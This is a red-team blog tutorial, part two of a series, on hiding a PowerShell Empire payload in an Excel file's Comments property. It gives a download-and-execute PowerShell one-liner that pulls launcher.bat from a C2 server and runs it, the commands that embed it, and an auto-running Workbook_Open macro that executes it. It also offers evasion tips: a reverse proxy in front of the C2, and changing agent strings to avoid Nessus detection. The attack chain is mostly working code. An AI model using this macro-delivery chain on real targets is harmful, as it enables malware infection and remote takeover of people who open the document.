---
title: "Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)"
date: 2017-12-06
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/Metasploit-1.png"
categories:
  - Security
tags:
  - Empire
  - Penetration Testing
  - PowerShell
  - Red Teaming
  - security
---

Building on from my previous post, this will primarily focus on delivering an Empire payload via an embedded offensive PowerShell script stored within the ‘comments’ property of an MS Excel document.



**PowerShell Empire:**



Begin by creating an Empire listener, see Empire’s documentation on how to get started with this by visiting the following URL: [https://www.powershellempire.com/?page_id=83](https://www.powershellempire.com/?page_id=83)



Note that in my configuration as illustrated in the screenshot below, the ‘Host’ entry, does not correspond to my C2 Empire Server, instead, this has been configured to point to a reverse-proxy utilising TLS / SSL encryption. This is considered to be good ‘OPSEC’ practice and allows easier portability.



The ‘Slack’ configuration has also been configured so that notifications will appear in our chosen Slack channel when agents are established.



Note: The agent strings were left in their default configuration, I advise these to be changed on actual engagements, as Nessus has the ability to detect Empire Listeners via the plugin id: *99592*



[https://www.tenable.com/plugins/index.php?view=single&id=99592](https://www.tenable.com/plugins/index.php?view=single&id=99592)

 [![](/wp-content/uploads/2017/12/ks-empire1.jpg)](/wp-content/uploads/2017/12/ks-empire1.jpg)

The next part of the process is to create a stager, this is our payload we’ll use when weaponizing a MS Excel document. For this example I’m going to use the self-deleting .bat executable:



*Empire: listeners) > usestager windows/launcher_bat*



*(Empire: stager/windows/launcher_bat) > set Listener http*

 [![](/wp-content/uploads/2017/12/ks-empire2.jpg)](/wp-content/uploads/2017/12/ks-empire2.jpg)

By default, the payload will be written to /tmp. Serve the payload via HTTP by launching a Python HTTP Server:


```
root@kali:/tmp# python -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 ...
```



Now it comes to weaponizing the MS Excel document, the steps in order to do this is similar to before, except the following offensive PowerShell script will be used to embed inside the ‘Comments’ property of the MS Excel document:



*PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.0.11:8000/launcher.bat’,’test.bat’);Start-Process ‘test.bat’*



**Note: The IP address: 192.168.0.11 is our Empire C2 server which is serving the launcher.bat payload. This will likely to be different in your environment.**



Upon execution, the PowerShell script will retrieve the Empire payload and execute it on the victim host.



In order to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the PowerShell script: ‘Commentator’ ([https://github.com/clr2of8/Commentator](https://github.com/clr2of8/Commentator))



Begin by starting PowerShell:


```
powershell.exe -exec bypass
```



Import the module into your PowerShell environment:


```
Import-Module .\Commentator.ps1
```



And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:


```
Invoke-Commentator -OfficeFile .\empire_posh_delivery.xlsx –CommentFile .\empire_posh_payload.txt
```



**Note: Given the size of the PowerShell script above, this was placed within the text file: *empire_posh_payload.txt***



After successful execution, a copy of your existing MS Office file will be created with the payload embedded:



*The new file with added comment has been written to .\empire_posh_delivery-wlc.xlsx.*



*DONE!*



This can be verified by inspecting the file’s metadata / properties:

 [![](/wp-content/uploads/2017/12/ks-empire3.jpg)](/wp-content/uploads/2017/12/ks-empire3.jpg)

Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:


```
Sub Workbook_Open()

Dim p As DocumentProperty



 For Each p In ActiveWorkbook.BuiltinDocumentProperties

    If p.Name = "Comments" Then

        Shell (p.Value)

    End If

 Next

End Sub
```



**Note: In order to utilise auto-execution via the ‘*Workbook_Open()*’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)**

 [![](/wp-content/uploads/2017/12/ks-empire4.jpg)](/wp-content/uploads/2017/12/ks-empire4.jpg)

After the victim has clicked ‘enable editing’ and ‘enable content’, an Empire agent session should appear:

 [![](/wp-content/uploads/2017/12/ks-empire5.jpg)](/wp-content/uploads/2017/12/ks-empire5.jpg) [![](/wp-content/uploads/2017/12/ks-empire6.jpg)](/wp-content/uploads/2017/12/ks-empire6.jpg)
### About The Author


 -  [](/)

       [**](https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/) [**](http://twitter.com/share?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29) [**](mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%202%20of%202)&body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/) [**](https://www.linkedin.com/sharing/share-offsite/?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29) [**](javascript:pinIt();) [**](https://t.me/share/url?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29) [**](https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29) [**](https://www.reddit.com/submit?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29) [**](javascript:window.print())    
## Post navigation

 [Executing Metasploit & Empire Payloads from MS Office Document Properties (part 1 of 2)](/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/)[Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators](/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/)
